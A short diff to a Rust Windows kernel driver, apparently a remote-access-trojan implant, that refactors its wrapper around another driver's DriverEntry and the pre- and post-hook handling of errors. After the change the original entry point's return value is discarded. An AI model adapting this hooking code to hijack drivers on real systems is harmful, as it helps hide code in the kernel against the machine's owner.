@@ -3,13 +3,13 @@
 extern crate alloc;
 extern crate wdk_panic;
 
-mod cleanup;
 mod driver;
 mod global;
 mod handlers;
+mod initialize;
 mod logger;
+mod state;
 mod string;
-mod threads;
 mod utils;
 mod wrappers;
 
@@ -19,7 +19,8 @@ use log::LevelFilter;
 use rat_common::windows::kernel::KernelHandoff;
 use wdk_alloc::WdkAllocator;
 use wdk_sys::{
-    NTSTATUS, PCUNICODE_STRING, PDRIVER_OBJECT, STATUS_INVALID_PARAMETER, STATUS_UNSUCCESSFUL,
+    NTSTATUS, PCUNICODE_STRING, PDRIVER_OBJECT, STATUS_INVALID_PARAMETER, STATUS_SUCCESS,
+    STATUS_UNSUCCESSFUL,
 };
 
 use crate::wrappers::mdl::MdlGuard;
@@ -87,9 +88,12 @@ pub unsafe extern "system" fn driver_entry(
         None => None,
     };
 
+    let mut status = STATUS_SUCCESS;
+
     // Invoke our pre-hook logic
-    if let Err(e) = driver::driver_entry_prehook(driver, registry_path_ref, &extra) {
-        error!("DriverEntry pre-hook error: {e}");
+    if let Err(s) = driver::driver_entry_prehook(driver, registry_path_ref, &extra) {
+        error!("DriverEntry pre-hook error: 0x{s:X}");
+        status = s;
     }
 
     // Call the original DriverEntry
@@ -97,14 +101,18 @@ pub unsafe extern "system" fn driver_entry(
         "Calling original DriverEntry at {:p}...",
         extra.driver_entry.address,
     );
-    let status = unsafe {
+    let original_status = unsafe {
         let original_fn = mem::transmute::<*mut u8, DriverEntryFn>(extra.driver_entry.address);
         original_fn(driver, registry_path)
     };
 
     // Invoke our post-hook logic
-    if let Err(e) = driver::driver_entry_posthook(driver, registry_path_ref, status, &extra) {
-        error!("DriverEntry post-hook error: {e}");
+    if let Err(s) =
+        driver::driver_entry_posthook(driver, registry_path_ref, original_status, &extra)
+    {
+        error!("DriverEntry post-hook error: 0x{s:X}");
+        status = s;
     }
+
     status
 }
